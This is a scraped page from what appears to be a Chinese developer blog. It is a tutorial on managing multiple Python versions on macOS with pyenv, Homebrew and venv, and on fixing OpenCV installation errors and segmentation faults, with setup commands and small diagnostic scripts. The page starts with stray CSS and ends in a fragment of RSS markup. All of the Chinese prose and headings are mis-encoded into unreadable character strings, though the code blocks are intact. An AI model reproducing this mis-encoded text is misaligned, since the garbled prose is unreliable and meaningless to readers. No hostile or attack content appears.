p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>2026å¹´2æœˆ5æ—¥ Â· 10åˆ†é’Ÿé˜…è¯»</p>
</blockquote>
<p>ä½œä¸ºPythonå¼€å‘è€…ï¼Œåœ¨Macä¸Šç®¡ç†å¤šä¸ªPythonç‰ˆæœ¬æ˜¯ä¸€é¡¹å¿…å¤‡æŠ€èƒ½ã€‚æ— è®ºæ˜¯ä¸ºäº†å…¼å®¹è€é¡¹ç›®ï¼Œè¿˜æ˜¯å°è¯•æ–°ç‰¹æ€§ï¼ŒæŒæ¡å¤šç‰ˆæœ¬ç®¡ç†éƒ½èƒ½è®©ä½ äº‹åŠåŠŸå€ã€‚æœ¬æ–‡å°†å¸¦ä½ ä»åŸºç¡€å®‰è£…åˆ°é«˜çº§æ’é”™ï¼Œä¸€ç«™å¼è§£å†³æ‰€æœ‰é—®é¢˜ã€‚</p>
<h2 data-id="heading-0">ä¸ºä»€ä¹ˆéœ€è¦å¤šç‰ˆæœ¬Pythonï¼Ÿ</h2>
<ul>
<li><strong>é¡¹ç›®å…¼å®¹æ€§</strong>ï¼šä¸åŒé¡¹ç›®ä¾èµ–ä¸åŒPythonç‰ˆæœ¬</li>
<li><strong>æ–°ç‰¹æ€§å°é²œ</strong>ï¼šæƒ³ç”¨Python 3.11çš„æ–°åŠŸèƒ½ï¼Œä½†ç”Ÿäº§ç¯å¢ƒè¿˜åœ¨3.8</li>
<li><strong>å­¦ä¹ æµ‹è¯•</strong>ï¼šéªŒè¯ä»£ç åœ¨ä¸åŒç‰ˆæœ¬çš„å…¼å®¹æ€§</li>
<li><strong>ä¾èµ–éš”ç¦»</strong>ï¼šé¿å…åŒ…å†²çªï¼Œä¿æŒç¯å¢ƒå¹²å‡€</li>
</ul>
<h2 data-id="heading-1">æ–¹æ³•ä¸€ï¼špyenv - ä¸“ä¸šå¼€å‘è€…çš„é¦–é€‰</h2>
<h3 data-id="heading-2">å®‰è£…ä¸é…ç½®</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># é€šè¿‡Homebrewå®‰è£…</span>
brew update
brew install pyenv

<span class="hljs-comment"># é…ç½®Shellç¯å¢ƒï¼ˆæ·»åŠ åˆ°~/.zshrcæˆ–~/.bash_profileï¼‰</span>
<span class="hljs-built_in">export</span> PATH=<span class="hljs-string">"<span class="hljs-variable">$HOME</span>/.pyenv/bin:<span class="hljs-variable">$PATH</span>"</span>
<span class="hljs-built_in">eval</span> <span class="hljs-string">"<span class="hljs-subst">$(pyenv init --path)</span>"</span>
<span class="hljs-built_in">eval</span> <span class="hljs-string">"<span class="hljs-subst">$(pyenv init -)</span>"</span>
</code></pre>
<h3 data-id="heading-3">å¸¸ç”¨å‘½ä»¤</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŸ¥çœ‹å¯å®‰è£…ç‰ˆæœ¬</span>
pyenv install --list

<span class="hljs-comment"># å®‰è£…æŒ‡å®šç‰ˆæœ¬</span>
pyenv install 3.9.7
pyenv install 3.11.4

<span class="hljs-comment"># æŸ¥çœ‹å·²å®‰è£…ç‰ˆæœ¬</span>
pyenv versions

<span class="hljs-comment"># è®¾ç½®å…¨å±€ç‰ˆæœ¬</span>
pyenv global 3.11.4

<span class="hljs-comment"># è®¾ç½®å±€éƒ¨ç‰ˆæœ¬ï¼ˆå½“å‰ç›®å½•ï¼‰</span>
pyenv <span class="hljs-built_in">local</span> 3.9.7

<span class="hljs-comment"># è®¾ç½®ä¸´æ—¶ç‰ˆæœ¬ï¼ˆå½“å‰ä¼šè¯ï¼‰</span>
pyenv shell 3.10.0
</code></pre>
<h3 data-id="heading-4">è™šæ‹Ÿç¯å¢ƒç®¡ç†</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å®‰è£…è™šæ‹Ÿç¯å¢ƒæ’ä»¶</span>
brew install pyenv-virtualenv

<span class="hljs-comment"># åˆ›å»ºè™šæ‹Ÿç¯å¢ƒ</span>
pyenv virtualenv 3.11.4 myproject-env

<span class="hljs-comment"># æ¿€æ´»è™šæ‹Ÿç¯å¢ƒ</span>
pyenv activate myproject-env

<span class="hljs-comment"># é€€å‡ºè™šæ‹Ÿç¯å¢ƒ</span>
pyenv deactivate
</code></pre>
<h2 data-id="heading-5">æ–¹æ³•äºŒï¼šHomebrew - ç®€å•ç›´æ¥</h2>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-comment"># å®‰è£…Python</span>
brew install python
brew install python@3.<span class="hljs-number">8</span>
brew install python@3.<span class="hljs-number">9</span>

<span class="hljs-comment"># åˆ‡æ¢ç‰ˆæœ¬</span>
brew <span class="hljs-keyword">link</span> --overwrite python@3.<span class="hljs-number">9</span>
</code></pre>
<h2 data-id="heading-6">æ–¹æ³•ä¸‰ï¼šå®˜æ–¹å®‰è£…åŒ… + è™šæ‹Ÿç¯å¢ƒ</h2>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åˆ›å»ºè™šæ‹Ÿç¯å¢ƒ</span>
python3.9 -m venv myenv
<span class="hljs-built_in">source</span> myenv/bin/activate

<span class="hljs-comment"># å®‰è£…ä¾èµ–</span>
pip install -r requirements.txt
</code></pre>
<h2 data-id="heading-7">ç‰ˆæœ¬ç®¡ç†å¯¹æ¯”è¡¨</h2>





























<table><thead><tr><th>å·¥å…·</th><th>ä¼˜ç‚¹</th><th>ç¼ºç‚¹</th><th>é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td><strong>pyenv</strong>â€‹</td><td>ç‰ˆæœ¬éš”ç¦»å¥½ï¼Œåˆ‡æ¢çµæ´»</td><td>å­¦ä¹ æ›²çº¿ç¨é™¡</td><td>éœ€è¦å¤šä¸ªç‰ˆæœ¬é¢‘ç¹åˆ‡æ¢</td></tr><tr><td><strong>Homebrew</strong>â€‹</td><td>å®‰è£…ç®€å•ï¼Œæ›´æ–°æ–¹ä¾¿</td><td>ç‰ˆæœ¬ç®¡ç†ç›¸å¯¹æœ‰é™</td><td>ä¸»è¦ä½¿ç”¨æœ€æ–°ç‰ˆæœ¬</td></tr><tr><td><strong>å®˜æ–¹å®‰è£…åŒ…</strong>â€‹</td><td>å®˜æ–¹æ”¯æŒï¼Œç¨³å®šå¯é </td><td>å¤šç‰ˆæœ¬ç®¡ç†éº»çƒ¦</td><td>éœ€è¦å®˜æ–¹ç¨³å®šç‰ˆæœ¬</td></tr></tbody></table>
<h2 data-id="heading-8">å¸¸è§é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ</h2>
<h3 data-id="heading-9">Q1: å¦‚ä½•æŸ¥çœ‹å½“å‰Pythonç‰ˆæœ¬ï¼Ÿ</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŸ¥çœ‹é»˜è®¤Pythonç‰ˆæœ¬</span>
python --version

<span class="hljs-comment"># æŸ¥çœ‹Python3ç‰ˆæœ¬</span>
python3 --version

<span class="hljs-comment"># æŸ¥çœ‹æ‰€æœ‰å·²å®‰è£…ç‰ˆæœ¬ï¼ˆpyenvï¼‰</span>
pyenv versions

<span class="hljs-comment"># æŸ¥çœ‹Pythonè·¯å¾„</span>
<span class="hljs-built_in">which</span> python
<span class="hljs-built_in">which</span> python3
</code></pre>
<h3 data-id="heading-10">Q2: å®‰è£…OpenCVæ—¶é‡åˆ°<code>No matching distribution found for cv2</code></h3>
<p><strong>é”™è¯¯ä¿¡æ¯</strong>ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">pip install cv2
ERROR: Could <span class="hljs-keyword">not</span> find a version that satisfies the requirement cv2
</code></pre>
<p><strong>åŸå› åˆ†æ</strong>ï¼š</p>
<p>OpenCVçš„PythonåŒ…åæ˜¯<code>opencv-python</code>ï¼Œä¸æ˜¯<code>cv2</code>ã€‚<code>cv2</code>æ˜¯å¯¼å…¥æ—¶ä½¿ç”¨çš„æ¨¡å—åã€‚</p>
<p><strong>æ­£ç¡®å®‰è£…æ–¹æ³•</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åŸºç¡€ç‰ˆæœ¬ï¼ˆæœ€å¸¸ç”¨ï¼‰</span>
pip install opencv-python

<span class="hljs-comment"># åŒ…å«é¢å¤–æ¨¡å—çš„å®Œæ•´ç‰ˆ</span>
pip install opencv-contrib-python

<span class="hljs-comment"># æ— GUIç‰ˆæœ¬ï¼ˆæœåŠ¡å™¨ä½¿ç”¨ï¼‰</span>
pip install opencv-python-headless
</code></pre>
<h3 data-id="heading-11">Q3: è¿è¡Œè„šæœ¬æ—¶å‡ºç°<code>segmentation fault</code></h3>
<p><strong>é”™è¯¯ä¿¡æ¯</strong>ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">1</span>] <span class="hljs-number">2887</span> segmentation fault python batch_process_urls.py
</code></pre>
<p><strong>å¯èƒ½åŸå› </strong>ï¼š</p>
<ol>
<li>Pythonä¸OpenCVçš„ABIä¸å…¼å®¹</li>
<li>M1/M2èŠ¯ç‰‡çš„æ¶æ„é—®é¢˜</li>
<li>å¤šä¸ªOpenCVç‰ˆæœ¬å†²çª</li>
<li>NumPyç‰ˆæœ¬ä¸å…¼å®¹</li>
</ol>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>
<h4 data-id="heading-12">æ–¹æ¡ˆAï¼šå®Œå…¨æ¸…ç†é‡è£…</h4>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># å¸è½½æ‰€æœ‰ç›¸å…³åŒ…</span>
pip uninstall -y opencv-python opencv-contrib-python opencv-python-headless
pip uninstall -y numpy

<span class="hljs-comment"># æ¸…ç†ç¼“å­˜</span>
pip cache purge

<span class="hljs-comment"># é‡æ–°å®‰è£…ç¨³å®šç‰ˆæœ¬ç»„åˆ</span>
pip install <span class="hljs-attr">numpy</span>==<span class="hljs-number">1.24</span>.<span class="hljs-number">0</span>
pip install <span class="hljs-attr">opencv-python</span>==<span class="hljs-number">4.8</span>.<span class="hljs-number">1.78</span>
</code></pre>
<h4 data-id="heading-13">æ–¹æ¡ˆBï¼šé’ˆå¯¹M1/M2èŠ¯ç‰‡</h4>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># ä½¿ç”¨Miniforge</span>
conda create -n cv_env <span class="hljs-attr">python</span>=<span class="hljs-number">3.9</span>
conda activate cv_env
conda install -c conda-forge opencv numpy
</code></pre>
<h4 data-id="heading-14">æ–¹æ¡ˆCï¼šä½¿ç”¨è™šæ‹Ÿç¯å¢ƒéš”ç¦»</h4>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># åˆ›å»ºå…¨æ–°è™šæ‹Ÿç¯å¢ƒ</span>
python -m venv opencv_env
source opencv_env/bin/activate

<span class="hljs-comment"># å®‰è£…æŒ‡å®šç‰ˆæœ¬</span>
pip install <span class="hljs-attr">numpy</span>==<span class="hljs-number">1.24</span>.<span class="hljs-number">0</span>
pip install <span class="hljs-attr">opencv-python</span>==<span class="hljs-number">4.8</span>.<span class="hljs-number">1.78</span>
</code></pre>
<h3 data-id="heading-15">Q4: ç‰¹å®šæ“ä½œå¯¼è‡´æ®µé”™è¯¯ï¼ˆå¦‚cv2.imdecodeï¼‰</h3>
<p><strong>é—®é¢˜å®šä½</strong>ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># é”™è¯¯å‘ç”Ÿåœ¨è§£ç å›¾ç‰‡æ—¶</span>
<span class="hljs-attr">img</span> = cv2.imdecode(image_array, cv2.IMREAD_COLOR)
</code></pre>
<p><strong>å®‰å…¨è§£ç å‡½æ•°</strong>ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_imdecode</span>(<span class="hljs-params">image_array, flags=cv2.IMREAD_COLOR, retries=<span class="hljs-number">3</span></span>):
    <span class="hljs-string">"""å®‰å…¨åœ°è§£ç å›¾ç‰‡ï¼Œé˜²æ­¢æ®µé”™è¯¯"""</span>
    <span class="hljs-keyword">if</span> image_array <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(image_array, np.ndarray):
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
        
    <span class="hljs-keyword">if</span> image_array.size == <span class="hljs-number">0</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
    
    <span class="hljs-comment"># ç¡®ä¿æ˜¯uint8ç±»å‹</span>
    <span class="hljs-keyword">if</span> image_array.dtype != np.uint8:
        <span class="hljs-keyword">try</span>:
            image_array = image_array.astype(np.uint8)
        <span class="hljs-keyword">except</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
    
    <span class="hljs-comment"># å°è¯•è§£ç </span>
    <span class="hljs-keyword">for</span> attempt <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(retries):
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># ç¡®ä¿æ•°ç»„è¿ç»­</span>
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> image_array.flags[<span class="hljs-string">'C_CONTIGUOUS'</span>]:
                image_array = np.ascontiguousarray(image_array)
                
            img = cv2.imdecode(image_array, flags)
            <span class="hljs-keyword">if</span> img <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
                <span class="hljs-keyword">return</span> img
                
        <span class="hljs-keyword">except</span> Exception:
            <span class="hljs-keyword">continue</span>
    
    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
</code></pre>
<h3 data-id="heading-16">Q5: pyenvç‰ˆæœ¬åˆ‡æ¢ä¸ç”Ÿæ•ˆ</h3>
<p><strong>æ£€æŸ¥æ­¥éª¤</strong>ï¼š</p>
<ol>
<li>ç¡®è®¤å·²æ­£ç¡®é…ç½®Shellç¯å¢ƒ</li>
<li>æŸ¥çœ‹ç‰ˆæœ¬ä¼˜å…ˆçº§ï¼š<code>pyenv version</code></li>
<li>æ£€æŸ¥å½“å‰ç›®å½•æ˜¯å¦æœ‰<code>.python-version</code>æ–‡ä»¶</li>
<li>é‡æ–°åŠ è½½é…ç½®ï¼š<code>exec $SHELL</code></li>
</ol>
<p><strong>è§£å†³å‘½ä»¤</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŸ¥çœ‹å½“å‰ç”Ÿæ•ˆç‰ˆæœ¬</span>
pyenv version

<span class="hljs-comment"># æŸ¥çœ‹ç‰ˆæœ¬ä¼˜å…ˆçº§</span>
pyenv versions

<span class="hljs-comment"># è®¾ç½®å…¨å±€ç‰ˆæœ¬</span>
pyenv global 3.11.4

<span class="hljs-comment"># é‡æ–°åˆå§‹åŒ–</span>
pyenv <span class="hljs-built_in">rehash</span>
</code></pre>
<h2 data-id="heading-17">å®ç”¨è„šæœ¬é›†åˆ</h2>
<h3 data-id="heading-18">1. Pythonç¯å¢ƒè¯Šæ–­è„šæœ¬</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment">#!/usr/bin/env python3</span>
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> platform
<span class="hljs-keyword">import</span> subprocess

<span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"Pythonç¯å¢ƒè¯Šæ–­æŠ¥å‘Š"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)

<span class="hljs-built_in">print</span>(<span class="hljs-string">f"Pythonç‰ˆæœ¬: <span class="hljs-subst">{sys.version}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"å¹³å°ä¿¡æ¯: <span class="hljs-subst">{platform.platform()}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"å¤„ç†å™¨: <span class="hljs-subst">{platform.processor()}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"å¯æ‰§è¡Œæ–‡ä»¶: <span class="hljs-subst">{sys.executable}</span>"</span>)

<span class="hljs-comment"># æ£€æŸ¥å…³é”®åŒ…</span>
packages = [<span class="hljs-string">'numpy'</span>, <span class="hljs-string">'opencv-python'</span>, <span class="hljs-string">'pandas'</span>, <span class="hljs-string">'matplotlib'</span>]
<span class="hljs-keyword">for</span> pkg <span class="hljs-keyword">in</span> packages:
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">import</span> importlib
        version = importlib.metadata.version(pkg)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{pkg}</span>: <span class="hljs-subst">{version}</span>"</span>)
    <span class="hljs-keyword">except</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{pkg}</span>: æœªå®‰è£…"</span>)

<span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
</code></pre>
<h3 data-id="heading-19">2. ä¸€é”®ä¿®å¤OpenCVè„šæœ¬</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># fix_opencv.sh</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">"å¼€å§‹ä¿®å¤OpenCVç¯å¢ƒ..."</span>

<span class="hljs-comment"># å¤‡ä»½å½“å‰ç¯å¢ƒ</span>
pip freeze &gt; requirements_backup.txt

<span class="hljs-comment"># æ¸…ç†é—®é¢˜åŒ…</span>
pip uninstall -y opencv-python opencv-contrib-python
pip uninstall -y numpy
pip cache purge

<span class="hljs-comment"># åˆ›å»ºæ–°ç¯å¢ƒ</span>
python -m venv opencv_fixed
<span class="hljs-built_in">source</span> opencv_fixed/bin/activate

<span class="hljs-comment"># å®‰è£…ç¨³å®šç‰ˆæœ¬</span>
pip install --upgrade pip
pip install numpy==1.24.0
pip install opencv-python==4.8.1.78

<span class="hljs-comment"># éªŒè¯å®‰è£…</span>
python -c <span class="hljs-string">"
import cv2
import numpy as np
print(f'âœ… OpenCV {cv2.__version__}')
print(f'âœ… NumPy {np.__version__}')
"</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">"ä¿®å¤å®Œæˆï¼æ¿€æ´»ç¯å¢ƒ: source opencv_fixed/bin/activate"</span>
</code></pre>
<h3 data-id="heading-20">3. å¤šç‰ˆæœ¬æµ‹è¯•è„šæœ¬</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment">#!/usr/bin/env python</span>
<span class="hljs-comment"># test_multiple_versions.py</span>

test_code = <span class="hljs-string">"""
import sys
print(f'Python {sys.version_info.major}.{sys.version_info.minor}')
import numpy as np
print(f'NumPy {np.__version__}')
try:
    import cv2
    print(f'OpenCV {cv2.__version__}')
except:
    print('OpenCVå¯¼å…¥å¤±è´¥')
"""</span>

<span class="hljs-comment"># åœ¨å¤šä¸ªPythonç‰ˆæœ¬ä¸­è¿è¡Œæµ‹è¯•</span>
versions = [<span class="hljs-string">'python3.8'</span>, <span class="hljs-string">'python3.9'</span>, <span class="hljs-string">'python3.10'</span>, <span class="hljs-string">'python3.11'</span>]

<span class="hljs-keyword">for</span> version <span class="hljs-keyword">in</span> versions:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\n<span class="hljs-subst">{<span class="hljs-string">'='</span>*<span class="hljs-number">40</span>}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æµ‹è¯• <span class="hljs-subst">{version}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'='</span>*<span class="hljs-number">40</span>)
    
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">import</span> subprocess
        result = subprocess.run([version, <span class="hljs-string">'-c'</span>, test_code], 
                              capture_output=<span class="hljs-literal">True</span>, text=<span class="hljs-literal">True</span>)
        <span class="hljs-built_in">print</span>(result.stdout)
        <span class="hljs-keyword">if</span> result.stderr:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"é”™è¯¯: <span class="hljs-subst">{result.stderr}</span>"</span>)
    <span class="hljs-keyword">except</span> FileNotFoundError:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{version}</span> æœªå®‰è£…"</span>)
</code></pre>
<h2 data-id="heading-21">æœ€ä½³å®è·µå»ºè®®</h2>
<h3 data-id="heading-22">1. é¡¹ç›®ç»“æ„è§„èŒƒ</h3>
<pre><code class="hljs language-bash" lang="bash">my_project/
â”œâ”€â”€ .python-version          <span class="hljs-comment"># pyenvç‰ˆæœ¬æ–‡ä»¶</span>
â”œâ”€â”€ .<span class="hljs-built_in">env</span>                     <span class="hljs-comment"># ç¯å¢ƒå˜é‡</span>
â”œâ”€â”€ requirements.txt         <span class="hljs-comment"># ç”Ÿäº§ä¾èµ–</span>
â”œâ”€â”€ requirements-dev.txt     <span class="hljs-comment"># å¼€å‘ä¾èµ–</span>
â”œâ”€â”€ src/                     <span class="hljs-comment"># æºä»£ç </span>
â”œâ”€â”€ tests/                   <span class="hljs-comment"># æµ‹è¯•ä»£ç </span>
â””â”€â”€ venv/                    <span class="hljs-comment"># è™šæ‹Ÿç¯å¢ƒï¼ˆ.gitignoreï¼‰</span>
</code></pre>
<h3 data-id="heading-23">2. ç‰ˆæœ¬é”å®š</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># requirements.txt</span>
<span class="hljs-attr">numpy</span>==<span class="hljs-number">1.24</span>.<span class="hljs-number">0</span>
<span class="hljs-attr">opencv-python</span>==<span class="hljs-number">4.8</span>.<span class="hljs-number">1.78</span>
<span class="hljs-attr">pandas</span>==<span class="hljs-number">2.0</span>.<span class="hljs-number">3</span>
<span class="hljs-attr">scikit-learn</span>==<span class="hljs-number">1.3</span>.<span class="hljs-number">0</span>

<span class="hljs-comment"># requirements-dev.txt</span>
-r requirements.txt
<span class="hljs-attr">pytest</span>==<span class="hljs-number">7.4</span>.<span class="hljs-number">0</span>
<span class="hljs-attr">black</span>==<span class="hljs-number">23.7</span>.<span class="hljs-number">0</span>
<span class="hljs-attr">flake8</span>==<span class="hljs-number">6.0</span>.<span class="hljs-number">0</span>
</code></pre>
<h3 data-id="heading-24">3. è‡ªåŠ¨åŒ–è„šæœ¬</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Makefile</span>
.PHONY: install <span class="hljs-built_in">test</span> lint clean

install:
	pip install -r requirements.txt
	pip install -r requirements-dev.txt

<span class="hljs-built_in">test</span>:
	pytest tests/ -v

lint:
	black src/
	flake8 src/

clean:
	find . -<span class="hljs-built_in">type</span> d -name <span class="hljs-string">"__pycache__"</span> -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">rm</span> -rf {} +
	find . -<span class="hljs-built_in">type</span> f -name <span class="hljs-string">"*.pyc"</span> -delete
</code></pre>
<h2 data-id="heading-25">æ€»ç»“</h2>
<p>åœ¨Macä¸Šç®¡ç†å¤šç‰ˆæœ¬Pythonçœ‹ä¼¼å¤æ‚ï¼Œä½†æŒæ¡æ­£ç¡®å·¥å…·å’Œæ–¹æ³•åï¼Œå…¶å®éå¸¸ç®€å•ã€‚å…³é”®ç‚¹æ€»ç»“ï¼š</p>
<ol>
<li><strong>æ–°æ‰‹å…¥é—¨</strong>ï¼šä»Homebrewå¼€å§‹ï¼Œç®€å•ç›´æ¥</li>
<li><strong>ä¸“ä¸šå¼€å‘</strong>ï¼šä½¿ç”¨pyenvï¼Œçµæ´»å¼ºå¤§</li>
<li><strong>é¡¹ç›®éš”ç¦»</strong>ï¼šåŠ¡å¿…ä½¿ç”¨è™šæ‹Ÿç¯å¢ƒ</li>
<li><strong>é—®é¢˜æ’é”™</strong>ï¼šåˆ†æ®µæµ‹è¯•ï¼Œé€æ­¥å®šä½</li>
<li><strong>ç‰ˆæœ¬æ§åˆ¶</strong>ï¼šé”å®šä¾èµ–ï¼Œç¡®ä¿å¯é‡ç°</li>
</ol>
<p>è®°ä½ï¼Œè‰¯å¥½çš„ç¯å¢ƒç®¡ç†ä¹ æƒ¯èƒ½èŠ‚çœå¤§é‡è°ƒè¯•æ—¶é—´ã€‚æŠ•èµ„æ—¶é—´å­¦ä¹ è¿™äº›å·¥å…·ï¼Œå°†åœ¨æœªæ¥è·å¾—ä¸°åšå›æŠ¥ã€‚</p>
<h2 data-id="heading-26">æ‰©å±•èµ„æº</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fpyenv%2Fpyenv" target="_blank" title="https://github.com/pyenv/pyenv" ref="nofollow noopener noreferrer">pyenvå®˜æ–¹æ–‡æ¡£</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.python.org%2F3%2Ftutorial%2Fvenv.html" target="_blank" title="https://docs.python.org/3/tutorial/venv.html" ref="nofollow noopener noreferrer">Pythonè™šæ‹Ÿç¯å¢ƒæ•™ç¨‹</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.opencv.org%2F4.x%2Fd0%2Fde3%2Ftutorial_py_intro.html" target="_blank" title="https://docs.opencv.org/4.x/d0/de3/tutorial_py_intro.html" ref="nofollow noopener noreferrer">OpenCV-Pythonå®‰è£…æŒ‡å—</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fsourabhbajaj.com%2Fmac-setup%2F" target="_blank" title="https://sourabhbajaj.com/mac-setup/" ref="nofollow noopener noreferrer">Macå¼€å‘ç¯å¢ƒé…ç½®å¤§å…¨</a></li>
</ul>
<hr/>
<p><em>æœ¬æ–‡åŸºäºå®é™…å¼€å‘ç»éªŒæ€»ç»“ï¼Œé€‚ç”¨äºmacOS 12+ç³»ç»Ÿï¼ŒPython 3.8+ç‰ˆæœ¬ã€‚å¦‚æœ‰é—®é¢˜æˆ–å»ºè®®ï¼Œæ¬¢è¿ç•™è¨€è®¨è®ºã€‚</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä» Excel åˆ° TXTï¼šç”¨ Python å’Œ Spire.XLS è½»æ¾å®Œæˆæ•°æ®è½¬æ¢]]></title>    <link>https://juejin.cn/post/7603054272158629938</link>    <guid>https://juejin.cn/post/7603054272158629938</guid>    <pubDate>2026-02-05T09:22:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603054272158629938" data-draft-id="7602982045138501678" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta 